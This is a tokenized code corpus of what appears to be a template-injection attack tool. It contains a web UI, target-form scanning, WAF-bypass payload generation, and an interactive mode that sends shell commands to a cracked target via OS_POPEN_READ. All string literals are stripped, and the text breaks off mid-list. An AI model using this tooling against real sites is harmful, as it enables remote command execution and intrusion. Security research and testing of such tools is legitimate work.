, <EOL> data = { <EOL> "<STR_LIT>" : task_id , <EOL> } , <EOL> ) <EOL> resp_data = resp . json ( ) <EOL> self . assertEqual ( resp_data [ "<STR_LIT>" ] , const . APICODE_OK ) <EOL> if resp_data [ "<STR_LIT>" ] : <EOL> if task_type == "<STR_LIT>" : <EOL> self . assertTrue ( resp_data [ "<STR_LIT>" ] ) <EOL> break <EOL> self . assertLessEqual ( time . perf_counter ( ) - start_time , max_time ) <EOL> def general_task_test ( self , request_data ) : <EOL> resp = requests . post ( WEBUI_URL + "<STR_LIT>" , data = request_data ) <EOL> resp_data = resp . json ( ) <EOL> self . assertEqual ( resp_data [ "<STR_LIT>" ] , const . APICODE_OK ) <EOL> task_id = resp_data [ "<STR_LIT>" ] <EOL> self . wait_for_task ( task_id , "<STR_LIT>" ) <EOL> resp = requests . post ( <EOL> WEBUI_URL + "<STR_LIT>" , <EOL> data = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : task_id , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> ) <EOL> resp_data = resp . json ( ) <EOL> self . assertEqual ( resp_data [ "<STR_LIT>" ] , const . APICODE_OK ) <EOL> task_id = resp_data [ "<STR_LIT>" ] <EOL> self . wait_for_task ( task_id , "<STR_LIT>" ) <EOL> resp = requests . post ( <EOL> WEBUI_URL + "<STR_LIT>" , <EOL> data = { <EOL> "<STR_LIT>" : task_id , <EOL> } , <EOL> ) <EOL> resp_data = resp . json ( ) <EOL> self . assertEqual ( resp_data [ "<STR_LIT>" ] , const . APICODE_OK ) <EOL> messages = resp_data [ "<STR_LIT>" ] <EOL> is_cmd_executed = any ( "<STR_LIT>" in msg for msg in messages ) <EOL> self . assertTrue ( is_cmd_executed ) <EOL> def test_crack ( self ) : <EOL> self . general_task_test ( <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : VULUNSERVER_URL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_scan ( self ) : <EOL> self . general_task_test ( <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : VULUNSERVER_URL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_crack_path ( self ) : <EOL> self . general_task_test ( <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : VULUNSERVER_URL + "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> </s>
<s> import logging <EOL> import threading <EOL> import time <EOL> import webbrowser <EOL> import uuid <EOL> from urllib . parse import urlparse <EOL> from typing import Union <EOL> from os import environ <EOL> from platform import system <EOL> from flask import Flask , render_template , request , jsonify <EOL> from . const import ( <EOL> DetectMode , <EOL> ReplacedKeywordStrategy , <EOL> TemplateEnvironment , <EOL> CALLBACK_GENERATE_FULLPAYLOAD , <EOL> CALLBACK_GENERATE_PAYLOAD , <EOL> CALLBACK_PREPARE_FULLPAYLOADGEN , <EOL> CALLBACK_SUBMIT , <EOL> CALLBACK_TEST_FORM_INPUT , <EOL> APICODE_OK , <EOL> APICODE_WRONG_INPUT , <EOL> DEFAULT_USER_AGENT , <EOL> OS_POPEN_READ , <EOL> ) <EOL> from . cracker import Cracker <EOL> from . options import Options <EOL> from . form import get_form , Form <EOL> from . full_payload_gen import FullPayloadGen <EOL> from . requester import HTTPRequester <EOL> from . scan_url import yield_form <EOL> from . submitter import Submitter , FormSubmitter , PathSubmitter <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> app = Flask ( __name__ ) <EOL> tasks = { } <EOL> class CallBackLogger : <EOL> def __init__ ( self , flash_messages , messages ) : <EOL> self . flash_messages = flash_messages <EOL> self . messages = messages <EOL> def callback_prepare_fullpayloadgen ( self , data ) : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> if data [ "<STR_LIT>" ] : <EOL> context_repr = "<STR_LIT>" . join ( <EOL> f"<STR_LIT>" for k , v in data [ "<STR_LIT>" ] . items ( ) <EOL> ) <EOL> self . messages . append ( f"<STR_LIT>" ) <EOL> else : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> if not data [ "<STR_LIT>" ] : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> def callback_generate_fullpayload ( self , data ) : <EOL> payload = ( <EOL> data [ "<STR_LIT>" ] <EOL> if len ( data [ "<STR_LIT>" ] ) < <NUM_LIT> <EOL> else data [ "<STR_LIT>" ] [ : <NUM_LIT> ] + "<STR_LIT>" <EOL> ) <EOL> self . messages . append ( f"<STR_LIT>" ) <EOL> if not data [ "<STR_LIT>" ] : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> def callback_generate_payload ( self , data ) : <EOL> payload_repr = data [ "<STR_LIT>" ] <EOL> if len ( payload_repr ) > <NUM_LIT> : <EOL> payload_repr = payload_repr [ : <NUM_LIT> ] + "<STR_LIT>" <EOL> req = f"<STR_LIT>" <EOL> self . flash_messages . append ( f"<STR_LIT>" ) <EOL> def callback_submit ( self , data ) : <EOL> if not data [ "<STR_LIT>" ] : <EOL> if data . get ( "<STR_LIT>" , None ) == "<STR_LIT>" : <EOL> self . flash_messages . append ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> elif data . get ( "<STR_LIT>" , None ) == "<STR_LIT>" : <EOL> self . flash_messages . append ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> else : <EOL> self . flash_messages . append ( "<STR_LIT>" ) <EOL> elif data . get ( "<STR_LIT>" , None ) == "<STR_LIT>" : <EOL> self . flash_messages . append ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> else : <EOL> self . flash_messages . append ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> def callback_test_form_input ( self , data ) : <EOL> if not data [ "<STR_LIT>" ] : <EOL> return <EOL> testsuccess_msg = ( <EOL> "<STR_LIT>" if data [ "<STR_LIT>" ] else "<STR_LIT>" <EOL> ) <EOL> will_print_msg = "<STR_LIT>" if data [ "<STR_LIT>" ] else "<STR_LIT>" <EOL> self . messages . append ( testsuccess_msg + will_print_msg ) <EOL> def __call__ ( self , callback_type , data ) : <EOL> def default_handler ( _ ) : <EOL> return logger . warning ( "<STR_LIT>" , callback_type ) <EOL> return { <EOL> CALLBACK_PREPARE_FULLPAYLOADGEN : self . callback_prepare_fullpayloadgen , <EOL> CALLBACK_GENERATE_FULLPAYLOAD : self . callback_generate_fullpayload , <EOL> CALLBACK_GENERATE_PAYLOAD : self . callback_generate_payload , <EOL> CALLBACK_SUBMIT : self . callback_submit , <EOL> CALLBACK_TEST_FORM_INPUT : self . callback_test_form_input , <EOL> } . get ( callback_type , default_handler ) ( data ) <EOL> class BaseCrackTaskThread ( threading . Thread ) : <EOL> def __init__ ( self ) : <EOL> super ( ) . __init__ ( ) <EOL> self . flash_messages = [ ] <EOL> self . messages = [ ] <EOL> self . callback = CallBackLogger ( self . flash_messages , self . messages ) <EOL> self . success = False <EOL> class CrackTaskThread ( BaseCrackTaskThread ) : <EOL> def __init__ ( self , url , form : Form , interval : float , options : Options ) : <EOL> super ( ) . __init__ ( ) <EOL> self . form = form <EOL> self . url = url <EOL> self . options = options <EOL> self . submitter : Union [ Submitter , None ] = None <EOL> self . full_payload_gen : Union [ FullPayloadGen , None ] = None <EOL> self . cracker : Union [ Cracker , None ] = None <EOL> self . requester = HTTPRequester ( interval = interval , user_agent = DEFAULT_USER_AGENT ) <EOL> def run ( self ) : <EOL> for input_field in self . form [ "<STR_LIT>" ] : <EOL> self . messages . append ( f"<STR_LIT>" ) <EOL> self . submitter = FormSubmitter ( <EOL> self . url , <EOL> self . form , <EOL> input_field , <EOL> self . requester , <EOL> self . callback , <EOL> ) <EOL> self . cracker = Cracker ( <EOL> self . submitter , <EOL> self . callback , <EOL> options = self . options , <EOL> ) <EOL> if not self . cracker . has_respond ( ) : <EOL> continue <EOL> self . full_payload_gen = self . cracker . crack ( ) <EOL> if self . full_payload_gen : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> self . success = True <EOL> break <EOL> if not self . success : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> class CrackPathTaskThread ( BaseCrackTaskThread ) : <EOL> def __init__ ( self , url , interval : float , options : Options ) : <EOL> super ( ) . __init__ ( ) <EOL> self . url = url <EOL> self . options = options <EOL> self . submitter : Union [ Submitter , None ] = None <EOL> self . full_payload_gen : Union [ FullPayloadGen , None ] = None <EOL> self . cracker : Union [ Cracker , None ] <EOL> self . requester = HTTPRequester ( interval = interval , user_agent = DEFAULT_USER_AGENT ) <EOL> def run ( self ) : <EOL> self . submitter = PathSubmitter ( self . url , self . requester , self . callback ) <EOL> self . cracker = Cracker ( self . submitter , self . callback , options = self . options ) <EOL> if not self . cracker . has_respond ( ) : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> return <EOL> self . full_payload_gen = self . cracker . crack ( ) <EOL> if self . full_payload_gen : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> self . success = True <EOL> class ScanTaskThread ( BaseCrackTaskThread ) : <EOL> def __init__ ( self , url , interval : float , options : Options ) : <EOL> super ( ) . __init__ ( ) <EOL> self . url = url <EOL> self . options = options <EOL> self . submitter : Union [ Submitter , None ] = None <EOL> self . full_payload_gen : Union [ FullPayloadGen , None ] = None <EOL> self . cracker : Union [ Cracker , None ] <EOL> self . requester = HTTPRequester ( interval = interval , user_agent = DEFAULT_USER_AGENT ) <EOL> def run ( self ) : <EOL> url_forms = ( <EOL> ( page_url , form ) <EOL> for ( page_url , forms ) in yield_form ( self . requester , self . url ) <EOL> for form in forms <EOL> ) <EOL> for page_url , form in url_forms : <EOL> for input_field in form [ "<STR_LIT>" ] : <EOL> self . messages . append ( f"<STR_LIT>" ) <EOL> self . submitter = FormSubmitter ( <EOL> page_url , <EOL> form , <EOL> input_field , <EOL> self . requester , <EOL> self . callback , <EOL> ) <EOL> self . cracker = Cracker ( <EOL> self . submitter , <EOL> self . callback , <EOL> options = self . options , <EOL> ) <EOL> if not self . cracker . has_respond ( ) : <EOL> continue <EOL> self . full_payload_gen = self . cracker . crack ( ) <EOL> if self . full_payload_gen : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> self . success = True <EOL> return <EOL> if not self . success : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> class InteractiveTaskThread ( threading . Thread ) : <EOL> def __init__ ( <EOL> self , <EOL> submitter : Submitter , <EOL> full_payload_gen : FullPayloadGen , <EOL> cmd : str , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . submitter = submitter <EOL> self . full_payload_gen = full_payload_gen <EOL> self . cmd = cmd <EOL> self . flash_messages = [ ] <EOL> self . messages = [ ] <EOL> self . callback = CallBackLogger ( self . flash_messages , self . messages ) <EOL> self . submitter . callback = self . callback <EOL> self . full_payload_gen . callback = self . callback <EOL> def run ( self ) : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> payload , will_print = self . full_payload_gen . generate ( OS_POPEN_READ , self . cmd ) <EOL> if not payload : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> return <EOL> if not will_print : <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> resp = self . submitter . submit ( payload ) <EOL> assert resp is not None <EOL> self . messages . append ( "<STR_LIT>" ) <EOL> self . messages . append ( resp . text ) <EOL> def manage_task_thread ( task : threading . Thread ) : <EOL> taskid = uuid . uuid4 ( ) . hex <EOL> task . daemon = True <EOL> task . start ( ) <EOL> tasks [ taskid ] = task <EOL> return taskid <EOL> def parse_options ( request_form ) -> Options : <EOL> options = Options ( ) <EOL> if request_form . get ( "<STR_LIT>" , None ) : <EOL> options . detect_mode = DetectMode ( request_form . get ( "<STR_LIT>" , None ) ) <EOL> if request_form . get ( "<STR_LIT>" , None ) : <EOL> options . environment = TemplateEnvironment ( request_form . get ( "<STR_LIT>" , None ) ) <EOL> if request_form . get ( "<STR_LIT>" , None ) : <EOL> options . replaced_keyword_strategy = ReplacedKeywordStrategy ( <EOL> request_form . get ( "<STR_LIT>" , None ) <EOL> ) <EOL> return options <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def index ( ) : <EOL> return render_template ( "<STR_LIT>" ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def crack_path ( ) : <EOL> return render_template ( "<STR_LIT>" ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def scan ( ) : <EOL> return render_template ( "<STR_LIT>" ) <EOL> @ app . route ( <EOL> "<STR_LIT>" , <EOL> methods = [ "<STR_LIT>" ] , <EOL> ) <EOL> def create_task ( ) : <EOL> task_type = request . form . get ( "<STR_LIT>" , None ) <EOL> if task_type == "<STR_LIT>" : <EOL> if request . form [ "<STR_LIT>" ] == "<STR_LIT>" or request . form [ "<STR_LIT>" ] == "<STR_LIT>" : <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_WRONG_INPUT , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> + f"<STR_LIT>" , <EOL> } <EOL> ) <EOL> taskid = manage_task_thread ( <EOL> CrackTaskThread ( <EOL> url = request . form [ "<STR_LIT>" ] , <EOL> form = get_form ( <EOL> action = request . form [ "<STR_LIT>" ] or urlparse ( request . form [ "<STR_LIT>" ] ) . path , <EOL> method = request . form [ "<STR_LIT>" ] , <EOL> inputs = request . form [ "<STR_LIT>" ] . split ( "<STR_LIT>" ) , <EOL> ) , <EOL> interval = float ( request . form [ "<STR_LIT>" ] ) , <EOL> options = parse_options ( request . form ) , <EOL> ) <EOL> ) <EOL> return jsonify ( { "<STR_LIT>" : APICODE_OK , "<STR_LIT>" : taskid } ) <EOL> if task_type == "<STR_LIT>" : <EOL> if request . form [ "<STR_LIT>" ] == "<STR_LIT>" : <EOL> return jsonify ( <EOL> { "<STR_LIT>" : APICODE_WRONG_INPUT , "<STR_LIT>" : "<STR_LIT>" } <EOL> ) <EOL> taskid = manage_task_thread ( <EOL> CrackPathTaskThread ( <EOL> url = request . form [ "<STR_LIT>" ] , <EOL> interval = float ( request . form [ "<STR_LIT>" ] ) , <EOL> options = parse_options ( request . form ) , <EOL> ) <EOL> ) <EOL> return jsonify ( { "<STR_LIT>" : APICODE_OK , "<STR_LIT>" : taskid } ) <EOL> if task_type == "<STR_LIT>" : <EOL> if request . form [ "<STR_LIT>" ] == "<STR_LIT>" : <EOL> return jsonify ( <EOL> { "<STR_LIT>" : APICODE_WRONG_INPUT , "<STR_LIT>" : "<STR_LIT>" } <EOL> ) <EOL> taskid = manage_task_thread ( <EOL> ScanTaskThread ( <EOL> url = request . form [ "<STR_LIT>" ] , <EOL> interval = float ( request . form [ "<STR_LIT>" ] ) , <EOL> options = parse_options ( request . form ) , <EOL> ) <EOL> ) <EOL> return jsonify ( { "<STR_LIT>" : APICODE_OK , "<STR_LIT>" : taskid } ) <EOL> if task_type == "<STR_LIT>" : <EOL> cmd , last_task_id = ( <EOL> request . form [ "<STR_LIT>" ] , <EOL> request . form [ "<STR_LIT>" ] , <EOL> ) <EOL> last_task = tasks . get ( last_task_id , None ) <EOL> if cmd == "<STR_LIT>" : <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_WRONG_INPUT , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> elif not isinstance ( last_task , BaseCrackTaskThread ) : <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_WRONG_INPUT , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> } <EOL> ) <EOL> elif not last_task . success : <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_WRONG_INPUT , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> } <EOL> ) <EOL> assert ( <EOL> last_task . submitter is not None and last_task . full_payload_gen is not None <EOL> ) <EOL> taskid = manage_task_thread ( <EOL> InteractiveTaskThread ( last_task . submitter , last_task . full_payload_gen , cmd ) <EOL> ) <EOL> return jsonify ( { "<STR_LIT>" : APICODE_OK , "<STR_LIT>" : taskid } ) <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_WRONG_INPUT , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> } <EOL> ) <EOL> @ app . route ( <EOL> "<STR_LIT>" , <EOL> methods = [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> ) <EOL> def watch_task ( ) : <EOL> if "<STR_LIT>" not in request . form : <EOL> return jsonify ( { "<STR_LIT>" : APICODE_WRONG_INPUT , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> if request . form [ "<STR_LIT>" ] not in tasks : <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_WRONG_INPUT , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> } <EOL> ) <EOL> taskid = request . form [ "<STR_LIT>" ] <EOL> task : Union [ CrackTaskThread , CrackPathTaskThread , InteractiveTaskThread ] = tasks [ <EOL> taskid <EOL> ] <EOL> if isinstance ( task , BaseCrackTaskThread ) : <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_OK , <EOL> "<STR_LIT>" : taskid , <EOL> "<STR_LIT>" : not task . is_alive ( ) , <EOL> "<STR_LIT>" : task . messages , <EOL> "<STR_LIT>" : task . flash_messages , <EOL> "<STR_LIT>" : task . success , <EOL> } <EOL> ) <EOL> if isinstance ( task , InteractiveTaskThread ) : <EOL> return jsonify ( <EOL> { <EOL> "<STR_LIT>" : APICODE_OK , <EOL> "<STR_LIT>" : taskid , <EOL> "<STR_LIT>" : not task . is_alive ( ) , <EOL> "<STR_LIT>" : task . messages , <EOL> "<STR_LIT>" : task . flash_messages , <EOL> } <EOL> ) <EOL> assert False , "<STR_LIT>" <EOL> def should_open_browser ( ) -> bool : <EOL> if system ( ) == "<STR_LIT>" : <EOL> return True <EOL> return environ . get ( "<STR_LIT>" ) is not None <EOL> def browser_open_url_delayed ( url , delay ) : <EOL> def f ( ) : <EOL> time . sleep ( delay ) <EOL> try : <EOL> webbrowser . open ( url ) <EOL> except webbrowser . Error : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> t = threading . Thread ( target = f ) <EOL> t . daemon = True <EOL> t . start ( ) <EOL> def main ( host = "<STR_LIT>" , port = <NUM_LIT> , open_browser = True ) : <EOL> if open_browser and should_open_browser ( ) : <EOL> browser_open_url_delayed ( f"<STR_LIT>" , <NUM_LIT> ) <EOL> app . run ( host = host , port = port ) <EOL> if __name__ == "<STR_LIT>" : <EOL> main ( ) <EOL> </s>
<s> from typing import Dict , Union <EOL> from . const import CONFIG , WafFunc <EOL> from . full_payload_gen import FullPayloadGen <EOL> full_payload_store : Dict [ int , FullPayloadGen ] = { } <EOL> def config_payload ( waf_func : WafFunc ) -> Union [ str , None ] : <EOL> full_payload = None <EOL> if id ( waf_func ) not in full_payload_store : <EOL> full_payload = FullPayloadGen ( waf_func ) <EOL> full_payload_store [ id ( waf_func ) ] = full_payload <EOL> else : <EOL> full_payload = full_payload_store [ id ( waf_func ) ] <EOL> payload , will_print = full_payload . generate ( CONFIG ) <EOL> if not will_print : <EOL> return None <EOL> return payload <EOL> </s>
<s> import sys <EOL> import random <EOL> import logging <EOL> import string <EOL> from typing import Dict , List , Union , Iterable <EOL> from urllib . parse import urlparse , urlunparse <EOL> from bs4 import BeautifulSoup <EOL> if sys . version_info >= ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing import Literal <EOL> else : <EOL> from typing_extensions import Literal <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> Form = Dict [ <EOL> Literal [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> Union [ str , set ] , <EOL> ] <EOL> def get_form ( action : str , inputs : Iterable , method : str = "<STR_LIT>" ) -> Form : <EOL> method = method . upper ( ) <EOL> if not action . startswith ( "<STR_LIT>" ) : <EOL> action = "<STR_LIT>" + action <EOL> assert method in [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> return { "<STR_LIT>" : action , "<STR_LIT>" : method , "<STR_LIT>" : set ( inputs ) } <EOL> def parse_forms ( url , html : Union [ str , BeautifulSoup ] ) -> List [ Form ] : <EOL> parsed_url = urlparse ( url ) <EOL> uri = parsed_url . path <EOL> if isinstance ( html , str ) : <EOL> bs_doc = BeautifulSoup ( html , "<STR_LIT>" ) <EOL> elif isinstance ( html , BeautifulSoup ) : <EOL> bs_doc = html <EOL> details = [ ] <EOL> for form_element in bs_doc . select ( "<STR_LIT>" ) : <EOL> form = get_form ( <EOL> action = form_element . attrs . get ( "<STR_LIT>" , uri ) , <EOL> method = form_element . attrs . get ( "<STR_LIT>" , "<STR_LIT>" ) . upper ( ) , <EOL> inputs = [ <EOL> element . attrs [ "<STR_LIT>" ] <EOL> for element in form_element . select ( "<STR_LIT>" ) <EOL> if "<STR_LIT>" in element . attrs <EOL> ] , <EOL> ) <EOL> details . append ( form ) <EOL> return details <EOL> def random_fill ( form : Form ) -> Dict [ str , str ] : <EOL> return { <EOL> k : "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase , k = <NUM_LIT> ) ) for k in form [ "<STR_LIT>" ] <EOL> } <EOL> def fill_form ( url , form , form_inputs = None , randomly_fill_other = True ) : <EOL> if randomly_fill_other : <EOL> fill = random_fill ( form ) <EOL> if form_inputs is not None : <EOL> fill . update ( form_inputs ) <EOL> else : <EOL> fill = form_inputs <EOL> return { <EOL> "<STR_LIT>" : urlunparse ( urlparse ( url ) . _replace ( path = form [ "<STR_LIT>" ] ) ) , <EOL> "<STR_LIT>" : form [ "<STR_LIT>" ] , <EOL> ( "<STR_LIT>" if form [ "<STR_LIT>" ] == "<STR_LIT>" else "<STR_LIT>" ) : fill , <EOL> } <EOL> </s>
<s> import logging <EOL> import sys <EOL> from . import payload_gen <EOL> from . colorize import colored <EOL> from . context_vars import ( <EOL> get_context_vars_manager , <EOL> ContextVariableManager , <EOL> ) <EOL> from . const import ( <EOL> DetectMode , <EOL> SET_STMT_PATTERNS , <EOL> CALLBACK_PREPARE_FULLPAYLOADGEN , <EOL> CALLBACK_GENERATE_FULLPAYLOAD , <EOL> STRING , <EOL> INTEGER , <EOL> OS_POPEN_READ , <EOL> EVAL , <EOL> WafFunc , <EOL> ) <EOL> from . options import Options <EOL> if sys . version_info >= ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing import Callable , Tuple , Union , Dict , Any , List , Literal <EOL> else : <EOL> from typing_extensions import Callable , Tuple , Union , Dict , Any , List , Literal <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> def get_outer_pattern ( <EOL> waf_func : Callable , <EOL> ) -> Union [ Tuple [ str , bool ] , Tuple [ None , None ] ] : <EOL> outer_payloads = [ <EOL> ( "<STR_LIT>" , "<STR_LIT>" , True ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" , True ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" , True ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" , False ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" , False ) , <EOL> ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> False , <EOL> ) , <EOL> ] <EOL> for test_payload , outer_pattern , will_print in outer_payloads : <EOL> if waf_func ( test_payload ) : <EOL> return outer_pattern , will_print <EOL> else : <EOL> logger . warning ( "<STR_LIT>" , colored ( "<STR_LIT>" , outer_pattern ) ) <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> return None , None <EOL> def context_payloads_to_context ( <EOL> context_payload : Dict [ str , Dict [ str , Any ] ] <EOL> ) -> Dict [ str , Any ] : <EOL> return { <EOL> var_name : var_value <EOL> for _ , d in context_payload . items ( ) <EOL> for var_name , var_value in d . items ( ) <EOL> } <EOL> class FullPayloadGen : <EOL> def __init__ ( <EOL> self , <EOL> waf_func : WafFunc , <EOL> callback : Union [ Callable [ [ str , Dict ] , None ] , None ] = None , <EOL> options : Union [ Options , None ] = None , <EOL> waf_expr_func : Union [ WafFunc , None ] = None , <EOL> ) : <EOL> self . waf_func = waf_func <EOL> self . prepared = False <EOL> self . extra_context_vars_prepared = False <EOL> self . added_extra_context_vars = set ( ) <EOL> self . _callback : Callable [ [ str , Dict ] , None ] = ( <EOL> callback if callback else ( lambda x , y : None ) <EOL> ) <EOL> self . context_vars : Union [ ContextVariableManager , None ] = None <EOL> self . outer_pattern , self . will_print = None , None <EOL> self . payload_gen = None <EOL> self . options = options if options else Options ( ) <EOL> self . waf_expr_func = waf_expr_func <EOL> @ property <EOL> def callback ( self ) : <EOL> return self . _callback <EOL> @ callback . setter <EOL> def callback ( self , callback ) : <EOL> self . _callback = callback <EOL> if self . payload_gen : <EOL> self . payload_gen . callback = callback <EOL> def do_prepare ( self ) -> bool : <EOL> if self . prepared : <EOL> return True <EOL> self . context_vars = get_context_vars_manager ( self . waf_func , self . options ) <EOL> self . outer_pattern , self . will_print = get_outer_pattern ( self . waf_func ) <EOL> if not self . outer_pattern : <EOL> return False <EOL> if self . will_print : <EOL> logger . info ( "<STR_LIT>" , colored ( "<STR_LIT>" , self . outer_pattern ) ) <EOL> else : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , self . outer_pattern ) , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ) <EOL> self . payload_gen = payload_gen . PayloadGenerator ( <EOL> self . waf_func , <EOL> self . context_vars . get_context ( ) , <EOL> self . callback , <EOL> options = self . options , <EOL> waf_expr_func = self . waf_expr_func , <EOL> ) <EOL> self . prepared = True <EOL> self . callback ( <EOL> CALLBACK_PREPARE_FULLPAYLOADGEN , <EOL> { <EOL> "<STR_LIT>" : self . context_vars . get_context ( ) , <EOL> "<STR_LIT>" : self . outer_pattern , <EOL> "<STR_LIT>" : self . will_print , <EOL> } , <EOL> ) <EOL> return True <EOL> def try_add_context_var ( self , value : str , clean_cache = True ) -> Literal [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] : <EOL> if not self . prepared and not self . do_prepare ( ) : <EOL> return "<STR_LIT>" <EOL> assert self . payload_gen and self . context_vars , "<STR_LIT>" <EOL> pattern = None <EOL> for fill_pattern , test_pattern in SET_STMT_PATTERNS : <EOL> if self . waf_func ( test_pattern ) : <EOL> pattern = fill_pattern <EOL> break <EOL> if pattern is None : <EOL> return "<STR_LIT>" <EOL> value_type = { str : STRING , int : INTEGER } [ type ( value ) ] <EOL> ret = self . payload_gen . generate_detailed ( value_type , value ) <EOL> if ret is None : <EOL> return "<STR_LIT>" <EOL> expression , used_context , _ = ret <EOL> if len ( expression ) - len ( repr ( value ) ) < <NUM_LIT> : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , expression ) , <EOL> ) <EOL> return "<STR_LIT>" <EOL> var_name = self . context_vars . generate_related_variable_name ( value ) <EOL> if not var_name : <EOL> var_name = self . context_vars . generate_random_variable_name ( ) <EOL> if not var_name : <EOL> return "<STR_LIT>" <EOL> payload = pattern . replace ( "<STR_LIT>" , var_name ) . replace ( "<STR_LIT>" , expression ) <EOL> success = self . add_context_variable ( <EOL> payload , { var_name : value } , check_waf = True , depends_on = used_context <EOL> ) <EOL> if not success : <EOL> return "<STR_LIT>" <EOL> if clean_cache : <EOL> self . payload_gen . cache_by_repr . clear ( ) <EOL> else : <EOL> self . payload_gen . delete_from_cache ( STRING , value ) <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , repr ( value ) ) , <EOL> colored ( "<STR_LIT>" , payload ) , <EOL> ) <EOL> return "<STR_LIT>" <EOL> def prepare_extra_context_vars ( self , append_targets : List [ str ] ) : <EOL> targets = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] + 